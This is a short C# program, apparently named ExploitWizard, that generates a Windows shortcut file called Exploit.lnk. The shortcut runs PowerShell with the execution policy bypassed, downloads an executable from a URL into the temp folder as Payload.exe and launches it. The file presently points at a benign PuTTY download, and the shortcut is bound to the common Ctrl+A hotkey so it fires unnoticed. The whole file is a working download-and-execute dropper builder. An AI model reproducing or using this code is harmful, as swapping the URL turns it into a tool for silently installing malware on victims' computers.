using System;
using Microsoft.Win32;
using IWshRuntimeLibrary;

namespace ExploitWizard
{
    class Program
    {
        static void Main(string[] args)
        {
            string lnk = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe";
            string flnm = "%temp%\\Payload.exe";
            string target = "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            string arguments = " -NoProfile -ExecutionPolicy Bypass -command `Invoke-WebRequest -Uri " + lnk + " -OutFile " + flnm + ";Start-Process " + flnm;

            IWshRuntimeLibrary.WshShell wshShell = new IWshRuntimeLibrary.WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcutFile = (IWshRuntimeLibrary.IWshShortcut)wshShell.CreateShortcut("Exploit.lnk");
            shortcutFile.TargetPath = target;
            shortcutFile.Arguments = arguments;
            shortcutFile.Hotkey = "Ctrl+A";
            shortcutFile.Save();
        }
    }
}
